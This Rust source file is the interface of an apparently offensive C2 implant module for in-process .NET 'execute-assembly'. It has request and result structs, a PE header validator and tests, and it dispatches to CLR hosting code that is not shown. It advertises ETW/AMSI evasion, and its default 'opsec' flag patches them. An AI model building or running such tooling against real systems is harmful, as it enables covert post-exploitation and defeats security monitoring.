//! mod-dotnet: .NET Assembly Execution Module
//!
//! Provides in-process execution of .NET assemblies using CLR hosting via COM.
//! This technique is commonly known as "execute-assembly" and is used by
//! Cobalt Strike, Sliver, and other C2 frameworks.
//!
//! ## Features
//! - In-process CLR hosting (no child process)
//! - Isolated AppDomain execution
//! - Console output capture
//! - ETW/AMSI evasion integration
//! - Memory cleanup on unload
//!
//! ## MITRE ATT&CK
//! - T1059.001 (PowerShell)
//! - T1129 (Execution via Module Load)
//! - T1106 (Native API)

pub mod error;
#[cfg(windows)]
pub mod clr;
#[cfg(windows)]
pub mod output;

pub use error::DotNetError;

/// Result type for dotnet operations
pub type Result<T> = core::result::Result<T, DotNetError>;

/// Request to execute a .NET assembly
#[derive(Debug, Clone)]
pub struct ExecuteAssemblyRequest {
    /// Raw assembly bytes (.NET PE)
    pub assembly: Vec<u8>,
    /// Entry point class name (e.g., "Program")
    pub class_name: Option<String>,
    /// Entry point method name (default: "Main")
    pub method_name: Option<String>,
    /// Command-line arguments
    pub args: Vec<String>,
    /// Target CLR version (e.g., "v4.0.30319")
    pub clr_version: Option<String>,
    /// Enable OPSEC mitigations (ETW/AMSI patching)
    pub opsec: bool,
    /// Timeout in seconds (0 = no timeout)
    pub timeout_secs: u32,
}

impl Default for ExecuteAssemblyRequest {
    fn default() -> Self {
        Self {
            assembly: Vec::new(),
            class_name: None,
            method_name: None,
            args: Vec::new(),
            clr_version: Some("v4.0.30319".to_string()),
            opsec: true,
            timeout_secs: 300, // 5 minutes default
        }
    }
}

/// Result of assembly execution
#[derive(Debug, Clone)]
pub struct ExecuteAssemblyResult {
    /// Whether execution succeeded
    pub success: bool,
    /// Exit code (if available)
    pub exit_code: Option<i32>,
    /// Captured stdout
    pub stdout: String,
    /// Captured stderr
    pub stderr: String,
    /// Error message (if failed)
    pub error: Option<String>,
    /// Execution time in milliseconds
    pub execution_time_ms: u64,
}

/// Execute a .NET assembly in-process
///
/// # Arguments
/// * `request` - Execution parameters including assembly bytes and arguments
///
/// # Returns
/// * `Ok(ExecuteAssemblyResult)` - Execution result with captured output
/// * `Err(DotNetError)` - If execution failed
///
/// # Example
/// ```ignore
/// let request = ExecuteAssemblyRequest {
///     assembly: assembly_bytes,
///     args: vec!["arg1".to_string(), "arg2".to_string()],
///     ..Default::default()
/// };
/// let result = execute_assembly(request)?;
/// println!("Output: {}", result.stdout);
/// ```
/// Validate that the provided bytes look like a .NET assembly (PE with MZ header).
///
/// This validation is available on all platforms and is used before attempting
/// CLR loading on Windows.
pub fn validate_assembly(assembly: &[u8]) -> Result<()> {
    if assembly.is_empty() {
        return Err(DotNetError::AssemblyLoadFailed(
            "empty assembly".to_string(),
        ));
    }

    if assembly.len() < 64 {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid assembly size".to_string(),
        ));
    }

    // Check MZ header
    if assembly[0] != 0x4D || assembly[1] != 0x5A {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid PE header (missing MZ)".to_string(),
        ));
    }

    // Read PE offset from DOS header at 0x3C
    let pe_offset = u32::from_le_bytes([
        assembly[60],
        assembly[61],
        assembly[62],
        assembly[63],
    ]) as usize;

    if pe_offset + 24 > assembly.len() {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid PE structure (truncated)".to_string(),
        ));
    }

    // Check PE signature "PE\0\0"
    if pe_offset + 4 <= assembly.len()
        && (assembly[pe_offset] != b'P'
            || assembly[pe_offset + 1] != b'E'
            || assembly[pe_offset + 2] != 0
            || assembly[pe_offset + 3] != 0)
    {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid PE signature".to_string(),
        ));
    }

    Ok(())
}

pub fn execute_assembly(request: ExecuteAssemblyRequest) -> Result<ExecuteAssemblyResult> {
    #[cfg(windows)]
    {
        clr::execute_assembly_impl(request)
    }

    #[cfg(not(windows))]
    {
        let _ = request;
        Err(DotNetError::UnsupportedPlatform(
            "CLR hosting is only available on Windows".to_string(),
        ))
    }
}

/// List available CLR versions on the system
pub fn list_clr_versions() -> Result<Vec<String>> {
    #[cfg(windows)]
    {
        clr::list_installed_runtimes()
    }

    #[cfg(not(windows))]
    {
        Err(DotNetError::UnsupportedPlatform(
            "CLR is only available on Windows".to_string(),
        ))
    }
}

/// Check if CLR is available
pub fn is_clr_available() -> bool {
    #[cfg(windows)]
    {
        clr::check_clr_available()
    }

    #[cfg(not(windows))]
    {
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_request() {
        let req = ExecuteAssemblyRequest::default();
        assert!(req.assembly.is_empty());
        assert!(req.opsec);
        assert_eq!(req.timeout_secs, 300);
    }

    #[test]
    fn test_clr_available() {
        // On non-Windows, should return false
        #[cfg(not(windows))]
        {
            assert!(!is_clr_available());
        }
    }

    #[test]
    fn test_list_versions_non_windows() {
        #[cfg(not(windows))]
        {
            assert!(list_clr_versions().is_err());
        }
    }

    #[test]
    fn test_execute_non_windows() {
        #[cfg(not(windows))]
        {
            let req = ExecuteAssemblyRequest::default();
            let result = execute_assembly(req);
            assert!(result.is_err());
        }
    }

    // --- Assembly validation tests (cross-platform) ---

    #[test]
    fn test_validate_assembly_empty() {
        let result = validate_assembly(&[]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("empty assembly"));
    }

    #[test]
    fn test_validate_assembly_too_small() {
        let result = validate_assembly(&[0x4D, 0x5A, 0x00]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("invalid assembly size"));
    }

    #[test]
    fn test_validate_assembly_bad_magic() {
        let data = vec![0u8; 128];
        let result = validate_assembly(&data);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("missing MZ"));
    }

    #[test]
    fn test_validate_assembly_truncated_pe() {
        let mut data = vec![0u8; 128];
        data[0] = 0x4D;
        data[1] = 0x5A;
        // PE offset at 0x3C pointing beyond data
        data[60] = 0xFF;
        data[61] = 0xFF;
        let result = validate_assembly(&data);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("truncated"));
    }

    #[test]
    fn test_validate_assembly_bad_pe_signature() {
        let mut data = vec![0u8; 256];
        data[0] = 0x4D;
        data[1] = 0x5A;
        data[60] = 0x80; // PE offset
        data[0x80] = b'X'; // Wrong signature
        data[0x81] = b'X';
        let result = validate_assembly(&data);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("invalid PE signature"));
    }

    #[test]
    fn test_validate_assembly_valid_pe() {
        let mut data = vec![0u8; 256];
        data[0] = 0x4D; // M
        data[1] = 0x5A; // Z
        data[60] = 0x80; // PE offset = 0x80
        data[0x80] = b'P';
        data[0x81] = b'E';
        data[0x82] = 0x00;
        data[0x83] = 0x00;
        let result = validate_assembly(&data);
        assert!(result.is_ok());
    }

    /// Helper to build a minimal valid PE for testing
    fn make_minimal_pe() -> Vec<u8> {
        let mut data = vec![0u8; 512];
        data[0] = 0x4D;
        data[1] = 0x5A;
        data[60] = 0x80;
        data[0x80] = b'P';
        data[0x81] = b'E';
        data[0x82] = 0x00;
        data[0x83] = 0x00;
        data
    }

    #[test]
    fn test_validate_assembly_minimal_pe() {
        let pe = make_minimal_pe();
        assert!(validate_assembly(&pe).is_ok());
    }

    #[test]
    fn test_non_windows_platform_guard() {
        #[cfg(not(windows))]
        {
            assert!(!is_clr_available());
            assert!(list_clr_versions().is_err());

            let req = ExecuteAssemblyRequest {
                assembly: make_minimal_pe(),
                ..Default::default()
            };
            let result = execute_assembly(req);
            assert!(result.is_err());
            let msg = result.unwrap_err().to_string();
            assert!(msg.contains("Windows") || msg.contains("platform"));
        }
    }
}
